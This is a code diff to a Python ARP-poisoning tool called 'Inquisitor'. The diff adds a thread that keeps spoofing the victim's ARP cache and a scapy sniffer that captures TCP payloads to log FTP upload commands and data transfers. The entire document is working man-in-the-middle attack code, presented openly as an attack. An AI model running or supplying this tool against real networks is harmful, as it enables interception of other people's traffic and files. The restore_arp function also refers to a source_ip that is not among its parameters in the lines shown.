@@ -1,7 +1,8 @@
 import sys
 import time
 import argparse
-from scapy.all import ARP, send, get_if_addr
+from threading import Thread
+from scapy.all import ARP, send, sniff, TCP, Raw, get_if_addr
 
 
 def arp_spoof(target_ip, spoof_ip, target_mac):
@@ -13,6 +14,24 @@ def restore_arp(target_ip, target_mac, source_mac):
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
     send(packet, count=5, verbose=False)
 
+def sniff_ftp_packets():
+    print("[*] Sniffing FTP traffic...")
+
+    def process_packet(pkt):
+        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+            payload = pkt[Raw].load.decode(errors='ignore')
+            if 'STOR' in payload or 'PUT' in payload:
+                print(f"[FTP] File upload command detected: {payload.strip()}")
+            elif pkt[TCP].dport >= 1024:  # Possible FTP data port
+                print(f"[FTP] Possible data transfer: {len(payload)} bytes")
+
+    sniff(filter="tcp", prn=process_packet, iface="eth0", store=0)
+
+def loop_spoof(args):
+    while True:
+        arp_spoof(args.IPtarget, args.IPsrc, args.MACtarget)
+        time.sleep(1)
+
 def main():
     parser = argparse.ArgumentParser(prog="Inquisitor", description="ARP poisoning")
     parser.add_argument("IPsrc", type=str, help="the IP to spoof (IP spoof)")
@@ -21,10 +40,12 @@ def main():
     parser.add_argument("MACtarget", type=str, help="the victim's MAC")
     args = parser.parse_args()
     try:
-        while True:
-            print("Spoofing...")
-            arp_spoof(args.IPtarget, args.IPsrc, args.MACtarget)
-            time.sleep(1)
+        spoof_thread = Thread(target=lambda: loop_spoof(args))
+        spoof_thread.daemon = True
+        spoof_thread.start()
+
+        # Start sniffing packets
+        sniff_ftp_packets()
     except KeyboardInterrupt:
         restore_arp(args.IPtarget, args.MACtarget, args.MACsrc)
         print("[C^] Attack closed")
